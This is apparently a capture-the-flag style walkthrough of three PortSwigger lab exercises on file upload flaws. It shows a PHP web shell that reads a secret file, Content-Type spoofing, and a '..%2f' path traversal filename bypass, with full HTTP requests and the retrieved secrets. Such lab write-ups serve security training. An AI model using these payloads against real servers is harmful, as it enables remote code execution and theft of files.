# File upload vulnerabilities


---

<details>
  <summary>Lab: Remote code execution via web shell upload</summary>

> ###  To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ``/home/carlos/secret``. Submit this secret using the button provided in the lab banner.

> You can log in to your own account using the following credentials: ``wiener:peter``


---

1. login as ``wiener``
2. make newfile ``exploit.php``

``content`` of it:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. on my profile try to upload this file instead of photo

<img width="1140" height="282" alt="image" src="https://github.com/user-attachments/assets/27a7e7ba-24e8-44f4-9cfa-f8f0237436a9" />

<img width="1541" height="690" alt="image" src="https://github.com/user-attachments/assets/d63874c1-6f17-4726-8cf3-2c43c93797cb" />

4. it successfully uploaded
5. now want to run this file we know form the request it saved in ``/files/avatars/exploit.php``

```url
https://0a6300e9038f3f07800e218600ea00a0.web-security-academy.net/files/avatars/exploit.php
```
```
mPcV5fg8QF3QG5vvRAjs2BIz4bVAcRra
```

<img width="1541" height="690" alt="image" src="https://github.com/user-attachments/assets/634cd97e-e1b8-4194-816f-b98dd585f83c" />

  
</details>











<details>
  <summary>Lab: Web shell upload via Content-Type restriction bypass</summary>

> ###  To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ``/home/carlos/secret``. Submit this secret using the button provided in the lab banner.

> You can log in to your own account using the following credentials: ``wiener:peter`` 

---

1. login as ``wiener``
2. try to upload the ``exploit.php`` file from the previous lab

<img width="1232" height="149" alt="image" src="https://github.com/user-attachments/assets/27c9ab4e-a4aa-45ea-bcbd-ca7e4a56f62b" />

```http
POST /my-account/avatar HTTP/1.1
Host: 0a5900f8048b466280958aeb001f0009.web-security-academy.net
Cookie: session=JQCpU8NyZ2a2NOLfc3h8MgTUU08KE6Qp
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------165255631921329333142258700441
Content-Length: 546
Origin: https://0a5900f8048b466280958aeb001f0009.web-security-academy.net
Referer: https://0a5900f8048b466280958aeb001f0009.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive


-----------------------------165255631921329333142258700441
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php


<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------165255631921329333142258700441
Content-Disposition: form-data; name="user"


wiener
-----------------------------165255631921329333142258700441
Content-Disposition: form-data; name="csrf"


SroXqhkioX5U46fb2pTZihfwA21q9io7
-----------------------------165255631921329333142258700441--


```

3. change ``Content-Type: application/x-php`` to

```http
Content-Type: image/jpeg
```

boom , it's uploaded successfully 

<img width="1402" height="677" alt="image" src="https://github.com/user-attachments/assets/85ce0cdc-84f1-47e7-8c51-aa44a7199c45" />

4. now run the ``exploit.php``

```
https://0a5900f8048b466280958aeb001f0009.web-security-academy.net/files/avatars/exploit.php
```

<img width="1107" height="188" alt="image" src="https://github.com/user-attachments/assets/f3f6f85d-7630-4d7d-860c-5c494be25cba" />

```
D7rWxnQnptgyIvGxDMbks5trX0Z2bT3w
```



  
</details>








<details>
  <summary>Lab: Web shell upload via path traversal</summary>


> ### This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability. ``path traversal``

> ###  To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ``/home/carlos/secret``. Submit this secret using the button provided in the lab banner.

> You can log in to your own account using the following credentials: ``wiener:peter`` 


---

1. login as ``wiener``
2. upload ``exploit.php`` file that we used in previous labs

<img width="979" height="170" alt="image" src="https://github.com/user-attachments/assets/b20ec59d-650a-4be2-843a-0f1ac37c31f2" />

it's uploaded successfully !!!

3. now try to run it 

```
https://0a78004503363a658cb1f98b00190005.web-security-academy.net/files/avatars/exploit.php
```

no thing happend !!!!

<img width="1034" height="380" alt="image" src="https://github.com/user-attachments/assets/53ce3704-b2f2-4b56-aba1-ce42a718c25f" />


```
/../../../../files/avatars/exploit.php
```

this mean it not allow files in this directory to excuted ``/avatars``

so if we put the file on ``/files`` by using ``path traversal`` it will run

4. now try to upload ``exploit.php`` again and intercpt the request

```http
POST /my-account/avatar HTTP/2
Host: 0a78004503363a658cb1f98b00190005.web-security-academy.net
Cookie: session=9q473x8Ya7X7vZoCqHNFpEhPDiMhsdur
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------423410706123145428642617479270
Content-Length: 546
Origin: https://0a78004503363a658cb1f98b00190005.web-security-academy.net
Referer: https://0a78004503363a658cb1f98b00190005.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers


-----------------------------423410706123145428642617479270
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php


<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------423410706123145428642617479270
Content-Disposition: form-data; name="user"


wiener
-----------------------------423410706123145428642617479270
Content-Disposition: form-data; name="csrf"


BvzgCzBq7ovrFY8tBRq8TrYlQF11tuIl
-----------------------------423410706123145428642617479270--


```

5. now change filename in ``Content-Disposition: form-data; name="avatar"; filename="exploit.php"`` to ``..%2fexploit.php`` we use ``..%2f`` to bypass the filter instead of ``../``

```
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

it's uploaded successfully this proof on ``path traversal``

<img width="1225" height="620" alt="image" src="https://github.com/user-attachments/assets/d74ed916-00fe-42c9-8edd-43c31ae05864" />


6. now run it form ``/files/exploit.php`` not ``/files/avatars/exploit.php``


```
https://0a78004503363a658cb1f98b00190005.web-security-academy.net/files/exploit.php
```


<img width="947" height="229" alt="image" src="https://github.com/user-attachments/assets/8527190e-e0e2-4937-a273-75f403014d34" />


```
MDkBY5byb22IlmP48nQqlbwOjszk9a0z
```

  
</details>









































